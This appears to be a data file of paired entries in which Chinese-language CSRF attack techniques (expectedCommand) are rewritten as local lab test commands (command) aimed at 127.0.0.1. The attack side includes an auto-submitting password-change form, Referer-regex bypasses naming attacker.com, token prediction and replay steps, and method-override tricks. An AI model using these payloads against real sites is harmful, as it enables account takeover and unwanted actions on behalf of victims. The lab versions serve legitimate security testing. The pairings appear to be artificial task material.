patches.expectedCommand:
<form action="http://target.com/change-password" method="POST">
  <input type="hidden" name="new_password" value="hacked123">
  <input type="hidden" name="confirm_password" value="hacked123">
  <input type="submit" value="Click me">
</form>
<script>document.forms[0].submit();</script>
patches.command:
<!doctype html>
<meta charset="utf-8">
<form action="http://127.0.0.1:18080/lab/csrf/profile-email" method="post">
  <input type="hidden" name="email" value="csrf-a1@lab.invalid">
  <input type="hidden" name="marker" value="CSRF_FORM_A1">
  <button type="submit">Submit local CSRF marker</button>
</form>
<script>document.forms[0].requestSubmit();</script>

patches.expectedCommand: 或直接诱导用户点击: http://target.com/delete?id=123

patches.command:
<script>
fetch("http://127.0.0.1:18080/lab/csrf/json-compatible", {
  method: "POST",
  credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: JSON.stringify({marker: "CSRF_TEXT_C3"})
}).then(response => document.body.dataset.status = String(response.status));
</script>

patches.expectedCommand: 点击领取红包 或短链接隐藏真实URL

使用Referrer Policy:
<meta name="referrer" content="no-referrer">
或使用data URL:
<data:text/html;base64,CSRF_PAYLOAD>
或使用HTTPS->HTTP降级
patches.command:
<!doctype html>
<meta name="referrer" content="no-referrer">
<form action="http://127.0.0.1:18080/lab/csrf/referer-control" method="post">
  <input type="hidden" name="marker" value="CSRF_NOREF_E5">
  <button type="submit">Submit no-referrer control</button>
</form>

patches.expectedCommand:
1. 检查Token是否可预测
2. 检查Token是否绑定会话
3. 检查Token是否在GET参数中泄露
4. 检查是否有Token重放漏洞
patches.command:
<!doctype html>
<form action="http://127.0.0.1:18080/lab/csrf/token-control" method="post">
  <input type="hidden" name="marker" value="CSRF_TOKEN_F6">
  <button type="submit">Submit missing-token control</button>
</form>

patches.expectedCommand:
# 正则只检查包含
Referer: http://attacker.com/target.com/
Referer: http://target.com.attacker.com/
Referer: http://attacktarget.com/

# 正则只检查开头
Referer: http://target.com.attacker.com/

# 正则只检查结尾
Referer: http://attacker.com/target.com
patches.command: for value in "http://attacker.invalid/allowed.invalid/" "http://allowed.invalid.attacker.invalid/" "http://attackallowed.invalid/"; do curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/referer-policy" -H "Referer: $value" --data "marker=REFERER_REGEX_A1" | jq -c '{referer,allowed,reason}'; done

patches.expectedCommand:
# 不发送Referer
<meta name="referrer" content="no-referrer">

# data URL
data:text/html,<script>CSRF</script>

# about:blank
about:blank

# HTTPS->HTTP降级
从HTTPS站点跳转到HTTP
patches.command:
<!doctype html>
<meta name="referrer" content="no-referrer">
<form action="http://127.0.0.1:18080/lab/csrf/referer-policy" method="post">
  <input type="hidden" name="marker" value="REFERER_EMPTY_B2">
  <button type="submit">Submit empty Referer control</button>
</form>

patches.expectedCommand:
# 从子域名发起
Referer: http://sub.target.com/attack

# 从兄弟域名发起
Referer: http://sibling.target.com/

# 利用子域名XSS
在子域名注入XSS发起CSRF

# origin-only
<meta name="referrer" content="origin">
Referer: http://target.com

# origin-when-cross-origin
<meta name="referrer" content="origin-when-cross-origin">

# 使用iframe嵌入目标
<iframe src="http://target.com" referrerpolicy="no-referrer">

# sandbox属性
<iframe sandbox="allow-scripts" src="...">

# Flash可以控制Referer
# 编译SWF发送自定义Referer

# 分析Token生成规律
# 常见弱Token模式:
- 时间戳
- 递增数字
- 用户ID哈希
- 弱随机数

# 预测并构造有效Token

# Token不验证会话
# 攻击步骤:
1. 攻击者获取自己的Token
2. 使用该Token构造CSRF
3. 诱使受害者提交

# Token可跨用户使用
patches.command: curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/token-binding" -H "X-Lab-Session: CSRF_VICTIM_B2" -H "X-CSRF-Token: CSRF_ATTACKER_TOKEN_B2" --data "marker=CSRF_BINDING_B2" | jq -e '.accepted == false and .reason == "token_session_mismatch"'

patches.expectedCommand:
# Token在URL中泄露
http://target.com/page?token=xxx

# Token在Referer中泄露
从包含Token的页面跳转

# Token在日志中泄露
服务器日志记录Token

# Token可重复使用
# 攻击步骤:
1. 获取有效Token
2. 多次使用同一Token
3. Token不过期或不失效
patches.command: for attempt in 1 2; do curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/token-replay" -H "X-Lab-Session: CSRF_SESSION_D4" -H "X-CSRF-Token: CSRF_ONE_TIME_D4" --data "marker=CSRF_REPLAY_D4" | jq -c '{attempt,accepted,reason}' --argjson attempt "$attempt"; done

patches.expectedCommand:
# 尝试删除Token参数
POST /action HTTP/1.1
# 不发送Token参数

# 尝试空Token
POST /action?token=

# 尝试删除Token头
patches.command: for mode in missing empty; do if [ "$mode" = missing ]; then header=(); else header=(-H "X-CSRF-Token:"); fi; curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/token-required" -H "X-Lab-Session: CSRF_SESSION_E5" "${header[@]}" --data "marker=CSRF_REQUIRED_E5" | jq -c '{accepted,reason}'; done

patches.expectedCommand:
# 使用_method参数
POST /action?_method=PUT&token=xxx

# 使用X-HTTP-Method-Override
X-HTTP-Method-Override: PUT
patches.command: curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/method-override" -H "X-HTTP-Method-Override: PUT" -H "X-Lab-Session: CSRF_SESSION_F6" --data "marker=CSRF_METHOD_F6" | jq -e '.csrf_checked == true'

patches.expectedCommand:
# 使用JSON格式提交
Content-Type: application/json
{"token": "xxx", "action": "delete"}

# 可能绕过Token验证
patches.command: curl --silent --show-error --max-time 5 -X POST "http://127.0.0.1:18080/lab/csrf/parser-consistency" -H "Content-Type: application/json" -H "X-Lab-Session: CSRF_SESSION_G7" --data '{"marker":"CSRF_JSON_G7"}' | jq -e '.csrf_checked == true and .accepted == false'
